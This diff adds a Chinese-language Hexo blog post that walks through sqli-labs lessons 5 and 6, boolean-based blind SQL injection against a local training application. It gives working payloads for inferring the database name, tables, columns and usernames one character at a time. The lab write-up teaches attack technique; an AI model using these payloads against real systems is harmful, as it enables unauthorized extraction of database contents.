@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Less 5,6 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="第五关： 本关和前四关不同，结果查询存在的话，不会像之前显示具体的账号密码，而是显示You are in………：  如果sql查询不存在的话，就不会显示You are in…….. 这样的话，我们就不能根据最先爆出的数据库名来进行爆破，因为我们不知道它的数据库名。这种类型的SQL注入属于盲注型，要我们对每个名一个一个字符盲推。 我们输入id&#x3D;1’观察报错信息：  那这里说明后台代码可能就是这样写">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Less 5,6">
+<meta property="og:url" content="http://example.com/2021/09/30/Less-5-6/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="第五关： 本关和前四关不同，结果查询存在的话，不会像之前显示具体的账号密码，而是显示You are in………：  如果sql查询不存在的话，就不会显示You are in…….. 这样的话，我们就不能根据最先爆出的数据库名来进行爆破，因为我们不知道它的数据库名。这种类型的SQL注入属于盲注型，要我们对每个名一个一个字符盲推。 我们输入id&#x3D;1’观察报错信息：  那这里说明后台代码可能就是这样写">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2021/09/30/images/image-20210930194920472.png">
+<meta property="og:image" content="http://example.com/2021/09/30/images/image-20210930202915353.png">
+<meta property="og:image" content="http://example.com/2021/09/30/images/image-20210930203423659.png">
+<meta property="og:image" content="http://example.com/2021/09/30/images/image-20210930204723266.png">
+<meta property="og:image" content="http://example.com/2021/09/30/images/image-20210930204841094.png">
+<meta property="og:image" content="http://example.com/2021/09/30/images/image7.png">
+<meta property="og:image" content="http://example.com/2021/09/30/images/image-20210930213840197.png">
+<meta property="og:image" content="http://example.com/2021/09/30/images/image-20210930214849914.png">
+<meta property="og:image" content="http://example.com/2021/09/30/images/image-20210930214919725.png">
+<meta property="og:image" content="http://example.com/2021/09/30/images/image-20210930220419552.png">
+<meta property="og:image" content="http://example.com/2021/09/30/images/image-20210930220358739.png">
+<meta property="og:image" content="http://example.com/2021/09/30/images/image-20210930221701384.png">
+<meta property="og:image" content="http://example.com/2021/09/30/images/image-20210930215225258.png">
+<meta property="og:image" content="http://example.com/2021/09/30/images/image-20210930221905892.png">
+<meta property="og:image" content="http://example.com/2021/09/30/images/image-20210930223229161.png">
+<meta property="og:image" content="http://example.com/2021/09/30/images/image-20210930225118492.png">
+<meta property="og:image" content="http://example.com/2021/09/30/images/image-20210930225256860.png">
+<meta property="og:image" content="http://example.com/2021/09/30/images/image-20210930224952343.png">
+<meta property="article:published_time" content="2021-09-30T11:31:21.000Z">
+<meta property="article:modified_time" content="2021-09-30T14:55:41.431Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="-web安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/09/30/images/image-20210930194920472.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-Less-5-6" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/09/30/Less-5-6/" class="article-date">
+  <time class="dt-published" datetime="2021-09-30T11:31:21.000Z" itemprop="datePublished">2021-09-30</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/sqli-labs/">-sqli-labs</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      Less 5,6
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <hr>
+<p><em><strong>第五关：</strong></em></p>
+<p>本关和前四关不同，结果查询存在的话，不会像之前显示具体的账号密码，而是显示You are in………：</p>
+<p><img src="../images/image-20210930194920472.png" alt="image-20210930194920472"></p>
+<p>如果sql查询不存在的话，就不会显示You are in……..</p>
+<p>这样的话，我们就不能根据最先爆出的数据库名来进行爆破，因为我们不知道它的数据库名。这种类型的SQL注入属于盲注型，要我们对每个名一个一个字符盲推。</p>
+<p>我们输入id=1’观察报错信息：</p>
+<p><img src="../images/image-20210930202915353.png" alt="image-20210930202915353"></p>
+<p>那这里说明后台代码可能就是这样写的：select * from users where id=’$id’ limit 0,1</p>
+<p>我们注释掉后面的语句，有回显，说明这里是基于单引号的盲注。其实我们注释掉的可以是类似 and ‘1’=’1这样的语句：</p>
+<p><img src="../images/image-20210930203423659.png" alt="image-20210930203423659"></p>
+<p>下面，就开始正题，我们要进行手工盲注测试：</p>
+<p>这里补充一些sql数据库函数：</p>
+<p>ascii(a)将a转换成其ASCII值<br>ord(a)将a转换成其ASCII值<br>left(a,b)从左往右截取字符串a的前b个字符<br>substr(a,b,c)从b位置开始，截取字符串a的c长度<br>mid(a,b,c)从位置b开始，截取a字符串的c位</p>
+<p>首先我们要知道数据库名，因为我们不能直接得到它的名，我们要一个一个把它的名的字符猜出来。那在这之前我们首先要知道它数据库名的长度：</p>
+<p>?id=1’ and (length(database())=1–+</p>
+<p><img src="../images/image-20210930204723266.png" alt="image-20210930204723266"></p>
+<p><img src="../images/image-20210930204841094.png" alt="image-20210930204841094"></p>
+<p>我们手工一个一个递增length的值，直到回显You are in……,此时的数值就是其数据库名的长度（8）</p>
+<p>然后我们要对数据库名的每个字符进行猜解:</p>
+<p>（这里不会跑脚本的话就尝试把ascii表里的每个字符试过去）</p>
+<p>?id=1’ and (left(database(),1)=’s’)–+</p>
+<p><strong>left(database(),1)=’s’</strong>表示数据库名从左往右取一个字符，判断该字符是否等于s<br><strong>left(database(),2)=’se’</strong>表示数据库名从左往右取两个个字符，判断该字符是否等于se</p>
+<p>~~</p>
+<p><img src="../images/image7.png" alt="img"></p>
+<p>我们可以打开命令行进行验证：</p>
+<p><img src="../images/image-20210930213840197.png" alt="image-20210930213840197"></p>
+<p>接下来猜解security下的表名的个数：</p>
+<p>?id=1’ and (select count(table_name) from information_schema.tables where table_schema=’security’)=1–+</p>
+<p>将“=”右边的1进行递增就可判断数据库 security下的个数：</p>
+<p><img src="../images/image-20210930214849914.png" alt="image-20210930214849914"></p>
+<p><img src="../images/image-20210930214919725.png" alt="image-20210930214919725"></p>
+<p>然后判断每个表名的长度：ascii(substr((select table_name from information_schema.tables where table_schema=”security” limit 0,1),1,1))–+</p>
+<p>使用这个payload，如果页面返回“You are in……”,则表示第一张表的长度为1，同样，我们对<strong>limit num1,1),num2,1)<strong>的num进行递增，如果进行到</strong>limit 0,1),7,1))<strong>时页面返回空，则说明第一张表的长度为7-1=6（其中</strong>num1</strong>表示表的参数：0表示security下第一个表）</p>
+<p><img src="../images/image-20210930220419552.png" alt="image-20210930220419552"></p>
+<p><img src="../images/image-20210930220358739.png" alt="image-20210930220358739"></p>
+<p>然后我们就拿这个表进行破解，猜表名：</p>
+<p>ascii(substr((select table_name from information_schema.tables where table_schema=”security” limit 0,1),1,1))=1–+</p>
+<p>这里等号右边的1表示第一个字符对应ascii码的值，递增，直到”You are in”</p>
+<p>举俩个例子：</p>
+<p><img src="../images/image-20210930221701384.png" alt="image-20210930221701384"></p>
+<p>打开cmd验证一下：</p>
+<p><img src="../images/image-20210930215225258.png" alt="image-20210930215225258"></p>
+<p>第一个表名：emails,第一个字符ed ascii码为101</p>
+<p><img src="../images/image-20210930221905892.png" alt="image-20210930221905892"></p>
+<p>第四个表users第一个字符u对应ascii码117</p>
+<p>接下来就要猜解每个表里的列的个数、列名以及列名长度，列名猜解，和上面原理都差不多，这里不再赘述，直接给出payload(以users表为例子)。</p>
+<p>猜解列的个数<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sqlilabs/Less-5/?id=1&#39;">http://127.0.0.1/sqlilabs/Less-5/?id=1&#39;</a> and (select count(column_name) from information_schema.columns where table_name=’users’)=%d–+</p>
+<p>猜解列名长度<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sqlilabs/Less-5/?id=1&#39;">http://127.0.0.1/sqlilabs/Less-5/?id=1&#39;</a> and ascii(substr((select column_name from information_schema.columns where table_name=”users” limit 0,1),1,1))–+</p>
+<p>猜解列名<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sqlilabs/Less-5/?id=1&#39;">http://127.0.0.1/sqlilabs/Less-5/?id=1&#39;</a> and ascii(substr((select column_name from information_schema.columns where table_name=”users” limit 0,1),1,1))=97–+</p>
+<p>最后就是要猜解每个列里面的具体字段的长度以及值了(这里以猜解username为例)</p>
+<p>判断字段长度<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sqlilabs/Less-5/?id=1&#39;">http://127.0.0.1/sqlilabs/Less-5/?id=1&#39;</a> and 1=(select count(username) from security.users)–+</p>
+<p>判断字段长度<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sqlilabs/Less-5/?id=1&#39;">http://127.0.0.1/sqlilabs/Less-5/?id=1&#39;</a> and ascii(substr((select username from security.users limit 0,1),1,1))–+</p>
+<p>判断字段值<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sqlilabs/Less-5/?id=1&#39;">http://127.0.0.1/sqlilabs/Less-5/?id=1&#39;</a> and ascii(substr((select username from security.users limit 0,1),1,1))=95–+</p>
+<p><img src="../images/image-20210930223229161.png" alt="image-20210930223229161"></p>
+<hr>
+<p><em><strong>第六关：</strong></em></p>
+<p>本关以“闭合，其余和第五关一样，详细参考第五关:</p>
+<img src="../images/image-20210930225118492.png" style="zoom:67%;" />
+
+<p><img src="../images/image-20210930225256860.png" alt="image-20210930225256860"></p>
+<p><img src="../images/image-20210930224952343.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/09/30/Less-5-6/" data-id="cku6v2ys00000qgui7vcrfran" data-title="Less 5,6" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">-web安全</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2021/09/30/sql%20%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">sql 注入简介</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/sqli-labs/">-sqli-labs</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">-web安全</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/web%E5%AE%89%E5%85%A8/" style="font-size: 10px;">-web安全</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/09/30/Less-5-6/">Less 5,6</a>
+          </li>
+        
+          <li>
+            <a href="/2021/09/30/sql%20%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/">sql 注入简介</a>
+          </li>
+        
+          <li>
+            <a href="/2021/09/29/Less-1-4/">Less 1~4</a>
+          </li>
+        
+          <li>
+            <a href="/2021/09/28/hello-world/">Hello World</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2021 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
